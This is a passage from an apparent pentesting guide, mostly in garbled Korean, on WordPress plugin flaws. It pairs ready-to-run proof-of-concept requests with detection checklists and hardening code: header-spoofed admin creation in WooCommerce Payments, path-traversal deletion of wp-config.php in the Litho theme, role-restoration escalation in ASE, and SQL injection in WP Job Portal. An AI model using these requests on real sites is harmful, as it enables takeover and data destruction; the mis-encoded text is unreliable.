- **`wp_ajax`**

í”ŒëŸ¬ê·¸ì¸ì´ í•¨ìˆ˜ë¥¼ ì‚¬ìš©ìì—ê²Œ ë…¸ì¶œí•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” AJAX í•¸ë“¤ëŸ¬ë¥¼ í†µí•œ ê²ƒì…ë‹ˆë‹¤. ì´ë“¤ í•¸ë“¤ëŸ¬ì—ëŠ” ë¡œì§, authorization, ë˜ëŠ” authentication ë²„ê·¸ê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²Œë‹¤ê°€ ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì´ authenticationê³¼ authorizationì„ wordpress nonceì˜ ì¡´ì¬ ì—¬ë¶€ì— ê¸°ë°˜í•˜ëŠ” ê²½ìš°ê°€ ê½¤ ìì£¼ ìˆìœ¼ë©°, ì´ nonceëŠ” **any user authenticated in the Wordpress instance might have** (ì—­í• ê³¼ ë¬´ê´€í•˜ê²Œ).

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`ë¥¼ ì‚¬ìš©í•˜ë©´ ì—”ë“œí¬ì¸íŠ¸ê°€ ëª¨ë“  ì‚¬ìš©ì(ì‹¬ì§€ì–´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì)ë„ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.**

> [!CAUTION]
> ë˜í•œ, ë§Œì•½ í•´ë‹¹ í•¨ìˆ˜ê°€ ì‚¬ìš©ì ê¶Œí•œì„ `wp_verify_nonce` í•¨ìˆ˜ë¡œë§Œ í™•ì¸í•œë‹¤ë©´, ì´ í•¨ìˆ˜ëŠ” ë‹¨ì§€ ì‚¬ìš©ìê°€ ë¡œê·¸ì¸ë˜ì–´ ìˆëŠ”ì§€ ì—¬ë¶€ë§Œ í™•ì¸í•  ë¿ ë³´í†µ ì‚¬ìš©ì ì—­í• (role)ì„ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê¶Œí•œì´ ë‚®ì€ ì‚¬ìš©ìê°€ ê¶Œí•œì´ ë†’ì€ ì‘ì—…ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **REST API**

ë˜í•œ `register_rest_route` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ wordpressì—ì„œ REST APIë¥¼ ë“±ë¡í•˜ì—¬ í•¨ìˆ˜ë¥¼ ë…¸ì¶œì‹œí‚¤ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback`ì€(ëŠ”) ì£¼ì–´ì§„ ì‚¬ìš©ìê°€ API ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ì½œë°± í•¨ìˆ˜ì…ë‹ˆë‹¤.

**ë‚´ì¥ëœ `__return_true` í•¨ìˆ˜ê°€ ì‚¬ìš©ë˜ë©´ ì‚¬ìš©ì ê¶Œí•œ ê²€ì‚¬ë¥¼ ë‹¨ìˆœíˆ ê±´ë„ˆëœë‹ˆë‹¤.**

- **php íŒŒì¼ì— ëŒ€í•œ ì§ì ‘ ì ‘ê·¼**

ë¬¼ë¡  WordpressëŠ” PHPë¥¼ ì‚¬ìš©í•˜ë©° í”ŒëŸ¬ê·¸ì¸ ë‚´ë¶€ì˜ íŒŒì¼ì€ ì›¹ì—ì„œ ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í”ŒëŸ¬ê·¸ì¸ì´ íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ì·¨ì•½í•œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ê³  ìˆë‹¤ë©´, ëª¨ë“  ì‚¬ìš©ìê°€ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ ë‚´ë¶€ í†µí•©ì´ë‚˜ reverse proxiesë¥¼ ìœ„í•œ "trusted header" ë‹¨ì¶• ê²½ë¡œë¥¼ êµ¬í˜„í•˜ê³ , í•´ë‹¹ í—¤ë”ë¥¼ REST ìš”ì²­ì˜ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ëŠ” ë° ì‚¬ìš©í•©ë‹ˆë‹¤. ì—…ìŠ¤íŠ¸ë¦¼ ì»´í¬ë„ŒíŠ¸ê°€ ê·¸ í—¤ë”ë¥¼ ìš”ì²­ì— ì•”í˜¸í•™ì ìœ¼ë¡œ ë°”ì¸ë”©í•˜ì§€ ì•Šìœ¼ë©´ ê³µê²©ìê°€ ì´ë¥¼ ìŠ¤í‘¸í•‘í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ê¶Œí•œì´ ìˆëŠ” REST ë¼ìš°íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- Impact: ì¸ì¦ë˜ì§€ ì•Šì€ ìƒíƒœì—ì„œ core users REST routeë¥¼ í†µí•´ ìƒˆ ê´€ë¦¬ì ê³„ì •ì„ ìƒì„±í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì´ ë°œìƒí•©ë‹ˆë‹¤.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (ì‚¬ìš©ì ID 1ì„ ê°•ì œ ì§€ì •í•˜ë©°, ì¼ë°˜ì ìœ¼ë¡œ ì²« ë²ˆì§¸ ê´€ë¦¬ì ê³„ì •ì…ë‹ˆë‹¤.)
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- í”ŒëŸ¬ê·¸ì¸ì€ í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” í—¤ë”ë¥¼ ì¸ì¦ ìƒíƒœì— ë§¤í•‘í•˜ê³  ê¶Œí•œ ê²€ì‚¬ë¥¼ ê±´ë„ˆë›´ë‹¤.
- WordPress coreëŠ” ì´ ë¼ìš°íŠ¸ì— ëŒ€í•´ `create_users` capabilityë¥¼ ê¸°ëŒ€í•œë‹¤; í”ŒëŸ¬ê·¸ì¸ í•´í‚¹ì€ í—¤ë”ì—ì„œ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì§ì ‘ ì„¤ì •í•˜ì—¬ ì´ë¥¼ ìš°íšŒí•œë‹¤.

Expected success indicators

- ìƒì„±ëœ ì‚¬ìš©ìë¥¼ ì„¤ëª…í•˜ëŠ” JSON ë°”ë””ì™€ í•¨ê»˜ HTTP 201.
- ìƒˆ ê´€ë¦¬ì ê³„ì •ì´ `wp-admin/users.php`ì— í‘œì‹œë¨.

Detection checklist

- `getallheaders()`, `$_SERVER['HTTP_...']` ë˜ëŠ” ì‚¬ìš©ì ì •ì˜ í—¤ë”ë¥¼ ì½ì–´ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ëŠ” vendor SDK(ì˜ˆ: `wp_set_current_user()`, `wp_set_auth_cookie()`)ë¥¼ grepí•œë‹¤.
- ìš”ì²­ í—¤ë”ì— ì˜ì¡´í•˜ê³  ê°•ë ¥í•œ `permission_callback` ê²€ì‚¬ê°€ ì—†ëŠ” ê¶Œí•œ ìˆëŠ” ì½œë°±ì— ëŒ€í•œ REST ë“±ë¡ì„ ê²€í† í•œë‹¤.
- REST í•¸ë“¤ëŸ¬ ë‚´ë¶€ì—ì„œ í—¤ë” ê°’ìœ¼ë¡œë§Œ ì œí•œëœ ìƒíƒœë¡œ ì‚¬ìš©ë˜ëŠ” ì½”ì–´ ì‚¬ìš©ì ê´€ë¦¬ í•¨ìˆ˜(`wp_insert_user`, `wp_create_user`)ì˜ ì‚¬ìš©ì„ ì°¾ì•„ë³¸ë‹¤.

Hardening

- í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” í—¤ë”ì—ì„œ ì¸ì¦ ë˜ëŠ” ê¶Œí•œì„ ìœ ë„í•˜ì§€ ë§ˆë¼.
- ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œê°€ ë°˜ë“œì‹œ ì‹ ì›ì„ ì£¼ì…í•´ì•¼ í•˜ëŠ” ê²½ìš°, í”„ë¡ì‹œì—ì„œ ì‹ ë¢°ë¥¼ ì¢…ë£Œí•˜ê³  ìˆ˜ì‹  ë³µì‚¬ë³¸ì„ ì œê±°(ì˜ˆ: ì—ì§€ì—ì„œ `unset X-Wcpay-Platform-Checkout-User`)í•œ ë‹¤ìŒ ì„œëª…ëœ í† í°ì„ ì „ë‹¬í•˜ê³  ì„œë²„ ì¸¡ì—ì„œ ê²€ì¦í•˜ë¼.
- ê¶Œí•œ ìˆëŠ” ë™ì‘ì„ ìˆ˜í–‰í•˜ëŠ” REST ë¼ìš°íŠ¸ì—ëŠ” `current_user_can()` ê²€ì‚¬ì™€ ì—„ê²©í•œ `permission_callback`ì„ ìš”êµ¬í•˜ë¼(ì ˆëŒ€ `__return_true` ì‚¬ìš© ê¸ˆì§€).
- í—¤ë” "impersonation"ë³´ë‹¤ 1st-party ì¸ì¦(ì¿ í‚¤, application passwords, OAuth)ì„ ì„ í˜¸í•˜ë¼.

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress í…Œë§ˆì™€ í”ŒëŸ¬ê·¸ì¸ì€ ì¢…ì¢… `wp_ajax_` ë° `wp_ajax_nopriv_` í›…ì„ í†µí•´ AJAX í•¸ë“¤ëŸ¬ë¥¼ ë…¸ì¶œí•œë‹¤. **_nopriv_** ë³€í˜•ì´ ì‚¬ìš©ë˜ë©´ **ì½œë°±ì´ ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìì— ì˜í•´ ì ‘ê·¼ ê°€ëŠ¥í•´ì§„ë‹¤**, ë”°ë¼ì„œ ë¯¼ê°í•œ ë™ì‘ì€ ì¶”ê°€ë¡œ ë‹¤ìŒì„ êµ¬í˜„í•´ì•¼ í•œë‹¤:

1. **ê¶Œí•œ ê²€ì‚¬** (ì˜ˆ: `current_user_can()` ë˜ëŠ” ìµœì†Œí•œ `is_user_logged_in()`), ê·¸ë¦¬ê³ 
2. **CSRF nonce** ë¥¼ `check_ajax_referer()` / `wp_verify_nonce()`ë¡œ ê²€ì¦, ê·¸ë¦¬ê³ 
3. **ì—„ê²©í•œ ì…ë ¥ ì •í™”/ê²€ì¦**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
ì´ ìŠ¤ë‹ˆí«ìœ¼ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” ë¬¸ì œ:

* **Unauthenticated access** â€“ `wp_ajax_nopriv_` í›…ì´ ë“±ë¡ë˜ì–´ ìˆë‹¤.
* **No nonce / capability check** â€“ ì–´ë–¤ ë°©ë¬¸ìë¼ë„ ì—”ë“œí¬ì¸íŠ¸ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆë‹¤.
* **No path sanitisation** â€“ ì‚¬ìš©ì ì œì–´ `fontfamily` ë¬¸ìì—´ì´ í•„í„°ë§ ì—†ì´ íŒŒì¼ì‹œìŠ¤í…œ ê²½ë¡œì— ì—°ê²°ë˜ì–´ classic `../../` traversalì„ í—ˆìš©í•œë‹¤.

#### Exploitation

ê³µê²©ìëŠ” ë‹¨ì¼ HTTP POST ìš”ì²­ì„ ë³´ë‚´ì–´ **uploads base directory ì´í•˜ì— ìˆëŠ”** ëª¨ë“  íŒŒì¼ì´ë‚˜ ë””ë ‰í„°ë¦¬(ë³´í†µ `<wp-root>/wp-content/uploads/`)ë¥¼ ì‚­ì œí•  ìˆ˜ ìˆë‹¤:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

* íŒŒì¼ ì‹œìŠ¤í…œ í—¬í¼(`copy()`, `unlink()`, `$wp_filesystem->delete()` ë“±)ë¥¼ í˜¸ì¶œí•˜ëŠ” `add_action( 'wp_ajax_nopriv_...')` ì½œë°±.
* í•„í„°ë§ë˜ì§€ ì•Šì€ ì‚¬ìš©ì ì…ë ¥ì„ ê²½ë¡œì— ì—°ê²°í•˜ëŠ” ê²½ìš°(`$_POST`, `$_GET`, `$_REQUEST` ë“±ì„ í™•ì¸).
* `check_ajax_referer()` ë° `current_user_can()`/`is_user_logged_in()` ì˜ ë¶€ì¬.

#### í•˜ë“œë‹
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **í•­ìƒ** ë””ìŠ¤í¬ì— ëŒ€í•œ ì“°ê¸°/ì‚­ì œ ì‘ì—…ì€ ê¶Œí•œì´ ìˆëŠ” ê²ƒìœ¼ë¡œ ì·¨ê¸‰í•˜ê³  ë‹¤ìŒì„ ë°˜ë“œì‹œ ì¬í™•ì¸í•˜ì„¸ìš”:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

ë§ì€ í”ŒëŸ¬ê·¸ì¸ì€ ì›ë˜ ì—­í• ì„ user metaì— ì €ì¥í•´ ë‚˜ì¤‘ì— ë³µì›í•  ìˆ˜ ìˆë„ë¡ "view as role" ë˜ëŠ” ì¼ì‹œì ì¸ ì—­í•  ì „í™˜ ê¸°ëŠ¥ì„ êµ¬í˜„í•©ë‹ˆë‹¤. ë³µì› ê²½ë¡œê°€ ìš”ì²­ íŒŒë¼ë¯¸í„°(ì˜ˆ: `$_REQUEST['reset-for']`)ì™€ í”ŒëŸ¬ê·¸ì¸ì´ ê´€ë¦¬í•˜ëŠ” ëª©ë¡ì—ë§Œ ì˜ì¡´í•˜ê³  capabilities ê²€ì‚¬ì™€ ìœ íš¨í•œ nonceë¥¼ í™•ì¸í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´, ì´ê²ƒì€ vertical privilege escalationì´ ë©ë‹ˆë‹¤.

ì‹¤ì œ ì‚¬ë¡€ëŠ” Admin and Site Enhancements (ASE) í”ŒëŸ¬ê·¸ì¸ (â‰¤ 7.6.2.1)ì—ì„œ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. reset ë¶„ê¸°ëŠ” ë‚´ë¶€ ë°°ì—´ `$options['viewing_admin_as_role_are']`ì— ì‚¬ìš©ìëª…ì´ ì¡´ì¬í•˜ë©´ `reset-for=<username>`ì— ë”°ë¼ ì—­í• ì„ ë³µì›í–ˆìœ¼ë‚˜, í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  user meta `_asenha_view_admin_as_original_roles`ì— ì €ì¥ëœ ì—­í• ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ê¸° ì „ì— `current_user_can()` ê²€ì‚¬ë‚˜ nonce ê²€ì¦ì„ ì „í˜€ ìˆ˜í–‰í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ì™œ ì•…ìš© ê°€ëŠ¥í•œê°€

- ì„œë²„ ì¸¡ ê¶Œí•œ í™•ì¸ ì—†ì´ `$_REQUEST['reset-for']`ì™€ í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ì„ ì‹ ë¢°í•¨.
- ì‚¬ìš©ìê°€ ì´ì „ì— `_asenha_view_admin_as_original_roles`ì— ë” ë†’ì€ ê¶Œí•œì´ ì €ì¥ë˜ì–´ ìˆë‹¤ê°€ ê¶Œí•œì´ ê°•ë“±ëœ ê²½ìš°, ë¦¬ì…‹ ê²½ë¡œë¥¼ í˜¸ì¶œí•˜ë©´ í•´ë‹¹ ê¶Œí•œì„ ë³µì›í•  ìˆ˜ ìˆìŒ.
- ì¼ë¶€ ë°°í¬ì—ì„œëŠ”, ì¸ì¦ëœ ì–´ë–¤ ì‚¬ìš©ìë¼ë„ `viewing_admin_as_role_are`ì— ì—¬ì „íˆ ë‚¨ì•„ìˆëŠ” ë‹¤ë¥¸ ì‚¬ìš©ìëª…ì— ëŒ€í•œ ë¦¬ì…‹ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŒ(ê¶Œí•œ ê²€ì¦ ê²°í•¨).

ê³µê²© ì „ì œ ì¡°ê±´

- í•´ë‹¹ ê¸°ëŠ¥ì´ í™œì„±í™”ëœ ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ ë²„ì „.
- íƒ€ê¹ƒ ê³„ì •ì´ ì´ì „ ì‚¬ìš©ìœ¼ë¡œ ì¸í•´ user metaì— ì €ì¥ëœ ì˜¤ë˜ëœ ê³ ê¶Œí•œ ì—­í• ì„ ë³´ìœ í•¨.
- ì¸ì¦ëœ ì„¸ì…˜(ì–´ë–¤ ê²ƒì´ë¼ë„ ê°€ëŠ¥); reset íë¦„ì—ì„œ nonce/capability ê²€ì¦ì´ ì—†ìŒ.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
ì·¨ì•½í•œ ë¹Œë“œì—ì„œëŠ” ì´ê²ƒì´ í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  ì €ì¥ëœ ì›ë˜ ì—­í• (ì˜ˆ: `administrator`)ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¨ë‹¤.

íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

- ì—­í•  ì „í™˜ ê¸°ëŠ¥ ì¤‘ user metaì— â€œì›ë˜ ì—­í• â€ì„ ìœ ì§€í•˜ëŠ” ê¸°ëŠ¥(ì˜ˆ: `_asenha_view_admin_as_original_roles`)ì„ ì°¾ì•„ë¼.
- ë‹¤ìŒê³¼ ê°™ì€ ì¬ì„¤ì •/ë³µì› ê²½ë¡œë¥¼ ì‹ë³„í•˜ë¼:
- ì‚¬ìš©ì ì´ë¦„ì„ `$_REQUEST` / `$_GET` / `$_POST`ì—ì„œ ì½ëŠ”ë‹¤.
- `current_user_can()` ë° `wp_verify_nonce()` / `check_admin_referer()` ì—†ì´ `add_role()` / `remove_role()`ë¡œ ì—­í• ì„ ë³€ê²½í•œë‹¤.
- í–‰ìœ„ìì˜ capabilities(ê¶Œí•œ) ëŒ€ì‹  í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ ë°°ì—´(ì˜ˆ: `viewing_admin_as_role_are`)ì„ ê¸°ë°˜ìœ¼ë¡œ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ê²ƒì„ ì‹ë³„í•˜ë¼.

ë³´ì•ˆ ê°•í™”

- ëª¨ë“  ìƒíƒœ ë³€ê²½ ë¶„ê¸°ë§ˆë‹¤ ê¶Œí•œ ê²€ì‚¬ë¥¼ ê°•ì œ ì ìš©(ì˜ˆ: `current_user_can('manage_options')` ë˜ëŠ” ë” ì—„ê²©í•œ ê²€ì‚¬).
- ëª¨ë“  ì—­í• /ê¶Œí•œ ë³€ê²½ì— ëŒ€í•´ nonceë¥¼ ìš”êµ¬í•˜ê³  ê²€ì¦í•˜ë¼: `check_admin_referer()` / `wp_verify_nonce()`.
- ìš”ì²­ìœ¼ë¡œ ì „ë‹¬ëœ ì‚¬ìš©ì ì´ë¦„ì„ ì ˆëŒ€ ì‹ ë¢°í•˜ì§€ ë§ê³ ; ì¸ì¦ëœ í–‰ìœ„ìì™€ ëª…ì‹œì  ì •ì±…ì— ë”°ë¼ ì„œë²„ ì¸¡ì—ì„œ ëŒ€ìƒ ì‚¬ìš©ìë¥¼ ê²°ì •í•˜ë¼.
- í”„ë¡œí•„/ì—­í•  ì—…ë°ì´íŠ¸ ì‹œ â€œì›ë˜ ì—­í• â€ ìƒíƒœë¥¼ ë¬´íš¨í™”í•˜ì—¬ ì˜¤ë˜ëœ ê³ ê¶Œí•œ ë³µì›ì„ ë°©ì§€í•˜ë¼:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- ì„ì‹œ ì—­í•  ì „í™˜ì„ ìœ„í•´ ìµœì†Œí•œì˜ ìƒíƒœë§Œ ì €ì¥í•˜ê³  ì‹œê°„ ì œí•œì´ ìˆëŠ” capability-guarded í† í° ì‚¬ìš©ì„ ê³ ë ¤í•˜ì„¸ìš”.

---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFsëŠ” ê´‘ë²”ìœ„í•œ íŒ¨í„´(SQLi, XSS, LFI)ì— ë§ì¶° íŠœë‹ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë§ì€ ê³ ìœ„í—˜ WordPress/plugin ì·¨ì•½ì ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ íŠ¹í™” ë¡œì§/auth ë²„ê·¸ë¡œ, ì—”ì§„ì´ WordPress ê²½ë¡œì™€ í”ŒëŸ¬ê·¸ì¸ ì˜ë¯¸ë¡ ì„ ì´í•´í•˜ì§€ ëª»í•˜ë©´ ì •ìƒ íŠ¸ë˜í”½ì²˜ëŸ¼ ë³´ì…ë‹ˆë‹¤.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Donâ€™t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ë˜í•œ, **ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” WordPress pluginsì™€ themesë§Œ ì„¤ì¹˜í•˜ì„¸ìš”**.

### ë³´ì•ˆ í”ŒëŸ¬ê·¸ì¸

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ê¸°íƒ€ ê¶Œì¥ì‚¬í•­**

- ê¸°ë³¸ **admin** ê³„ì • ì œê±°
- **ê°•ë ¥í•œ ë¹„ë°€ë²ˆí˜¸**ì™€ **2FA** ì‚¬ìš©
- ì •ê¸°ì ìœ¼ë¡œ ì‚¬ìš©ì **ê¶Œí•œ**ì„ **ê²€í† **í•˜ì„¸ìš”
- **ë¡œê·¸ì¸ ì‹œë„ ì œí•œ**ìœ¼ë¡œ Brute Force ê³µê²©ì„ ë°©ì§€í•˜ì„¸ìš”
- **`wp-admin.php`** íŒŒì¼ëª…ì„ ë³€ê²½í•˜ê³  ë‚´ë¶€ ë˜ëŠ” íŠ¹ì • IPì—ì„œë§Œ ì ‘ê·¼ì„ í—ˆìš©í•˜ì„¸ìš”.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal ì±„ìš© í”ŒëŸ¬ê·¸ì¸ì€ **savecategory** ì‘ì—…ì„ ë…¸ì¶œí–ˆìœ¼ë©°, ì´ëŠ” ê¶ê·¹ì ìœ¼ë¡œ `modules/category/model.php::validateFormData()` ë‚´ë¶€ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì·¨ì•½í•œ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **ê²€ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì ì…ë ¥** â€“ `parentid`ê°€ HTTP ìš”ì²­ì—ì„œ ê·¸ëŒ€ë¡œ ì „ë‹¬ë©ë‹ˆë‹¤.
2. **WHERE ì ˆ ë‚´ë¶€ì˜ ë¬¸ìì—´ ì—°ê²°** â€“ `is_numeric()` / `esc_sql()` / prepared statementê°€ ì—†ìŠµë‹ˆë‹¤.
3. **ì¸ì¦ë˜ì§€ ì•Šì€ ì ‘ê·¼ ê°€ëŠ¥ì„±** â€“ ì•¡ì…˜ì€ `admin-post.php`ë¥¼ í†µí•´ ì‹¤í–‰ë˜ì§€ë§Œ, ìœ ì¼í•œ ê²€ì¦ì€ **CSRF nonce** (`wp_verify_nonce()` )ì´ë©°, ì´ëŠ” ë‹¨ì¶•ì½”ë“œ `[wpjobportal_my_resumes]`ë¥¼ í¬í•¨í•œ ê³µê°œ í˜ì´ì§€ì—ì„œ ëˆ„êµ¬ë‚˜ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Exploitation

1. Grab a fresh nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inject arbitrary SQL by abusing `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
The response discloses the result of the injected query or alters the database, proving SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **ë””ìŠ¤í¬ìƒì˜ ëª¨ë“  íŒŒì¼** via path traversal. The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
